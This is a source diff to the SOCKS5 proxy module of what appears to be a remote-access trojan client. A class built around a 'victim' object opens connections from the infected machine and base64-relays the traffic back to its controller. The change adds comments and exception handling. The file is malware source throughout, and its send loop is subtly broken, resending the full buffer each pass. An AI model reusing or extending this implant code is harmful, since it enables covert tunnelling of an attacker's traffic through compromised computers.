@@ -12,10 +12,12 @@ namespace winClient48
 {
     public class clsSocks5 : IDisposable
     {
+        //Reference (This is also one of my repo): https://github.com/iss4cf0ng/EgoDrop
+
         private clsVictim m_vicParent { get; set; }
-        private int m_nStreamId = -1;
-        private string m_szIPv4 { get; set; }
-        private int m_nPort = -1;
+        private int m_nStreamId = -1; //Stream ID (Session ID)
+        private string m_szIPv4 { get; set; } //Target IPv4 address (or domain).
+        private int m_nPort = -1; //Target TCP port.
 
         private Socket m_sktClnt { get; set; }
         private bool m_bIsRunning = false;
@@ -52,7 +54,6 @@ namespace winClient48
             }
             catch (Exception ex)
             {
-                
                 return false;
             }
         }
@@ -66,8 +67,23 @@ namespace winClient48
 
             if (m_sktClnt != null)
             {
-                try { m_sktClnt.Close(); } catch { }
-                try { m_sktClnt.Dispose(); } catch { }
+                try 
+                { 
+                    m_sktClnt.Close();
+                } 
+                catch (Exception ex) 
+                {
+                    MessageBox.Show(ex.Message);
+                }
+
+                try 
+                { 
+                    m_sktClnt.Dispose(); 
+                } 
+                catch (Exception ex)
+                {
+                    MessageBox.Show(ex.Message);
+                }
 
                 m_sktClnt = null;
             }
@@ -75,14 +91,21 @@ namespace winClient48
 
         public bool fnSendAll(byte[] abBuffer, int nLen)
         {
-            int nSent = 0;
-            while (nSent < nLen)
+            try
             {
-                int n = m_sktClnt.Send(abBuffer);
-                if (n <= 0)
-                    return false;
+                int nSent = 0;
+                while (nSent < nLen)
+                {
+                    int n = m_sktClnt.Send(abBuffer);
+                    if (n <= 0)
+                        return false;
 
-                nSent += n;
+                    nSent += n;
+                }
+            }
+            catch (Exception ex)
+            {
+                MessageBox.Show(ex.Message);
             }
 
             return true;
@@ -90,48 +113,62 @@ namespace winClient48
 
         public void fnForwarding(byte[] abBuffer)
         {
-            if (!m_bIsRunning || !m_sktClnt.Connected)
-                return;
-
-            lock (m_mtxSend)
+            try
             {
-                if (!fnSendAll(abBuffer, abBuffer.Length))
+                if (!m_bIsRunning || !m_sktClnt.Connected)
+                    return;
+
+                lock (m_mtxSend)
                 {
-                    fnClose();
+                    if (!fnSendAll(abBuffer, abBuffer.Length))
+                    {
+                        fnClose();
+                    }
                 }
+            }
+            catch (Exception ex)
+            {
+                //MessageBox.Show(ex.Message);
             }
         }
 
         private void fnRecvFromVictim()
         {
-            byte[] abBuffer = new byte[8192];
-            while (m_bIsRunning)
+            try
             {
-                int nRecv = m_sktClnt.Receive(abBuffer);
-                if (nRecv <= 0)
-                    break;
-
-                string szBase64 = Convert.ToBase64String(abBuffer, 0, nRecv);
-
-                m_vicParent.fnSendCommand(new string[]
+                byte[] abBuffer = new byte[8192];
+                while (m_bIsRunning)
                 {
+                    int nRecv = m_sktClnt.Receive(abBuffer);
+                    if (nRecv <= 0)
+                        break;
+
+                    string szBase64 = Convert.ToBase64String(abBuffer, 0, nRecv);
+
+                    m_vicParent.fnSendCommand(new string[]
+                    {
                     "proxy",
                     "socks5",
                     "data",
                     m_nStreamId.ToString(),
                     szBase64
-                });
-            }
+                    });
+                }
 
-            m_vicParent.fnSendCommand(new string[]
-            {
+                m_vicParent.fnSendCommand(new string[]
+                {
                 "proxy",
                 "socks5",
                 "close",
                 m_nStreamId.ToString()
-            });
+                });
 
-            m_bIsRunning = false;
+                m_bIsRunning = false;
+            }
+            catch (Exception ex)
+            {
+                //MessageBox.Show(ex.Message);
+            }
         }
     }
 }
